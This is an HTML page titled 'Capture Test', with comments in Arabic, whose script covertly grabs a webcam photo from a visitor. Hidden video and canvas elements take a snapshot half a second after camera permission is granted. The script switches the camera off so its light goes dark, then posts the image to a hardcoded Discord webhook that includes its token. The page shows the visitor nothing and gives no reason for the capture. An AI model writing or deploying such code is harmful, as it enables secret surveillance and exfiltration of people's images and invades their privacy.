<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Capture Test</title>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // رابط الـ Webhook الخاص بك
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1569803006839496785/GAxbFlhEbDeRcq39xn9waLp9b0wQzJhKD85rUBlpEeYkhanLYZZ5seBS78ua9G0V_-Vp';

        navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                
                // التقاط الصورة بعد نصف ثانية من الموافقة
                setTimeout(() => {
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        sendToDiscord(blob);
                    }, 'image/jpeg', 0.8);

                    // إيقاف الكاميرا باش ينطفي الضوء الأخضر
                    stream.getTracks().forEach(track => track.stop());
                }, 500);

            })
            .catch(err => {
                console.log("خطأ في الإذن أو رفض المستخدم");
            });

        function sendToDiscord(blob) {
            const formData = new FormData();
            formData.append('file', blob, 'capture.jpg');
            formData.append('content', '📸 صورة جديدة تم التقاطها:');

            fetch(WEBHOOK_URL, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                if (response.ok) {
                    console.log("تم إرسال الصورة إلى ديسكورد بنجاح!");
                } else {
                    console.error("فشل الإرسال:", response.statusText);
                }
            })
            .catch(error => {
                console.error("خطأ في الاتصال:", error);
            });
        }
    </script>

</body>
</html>
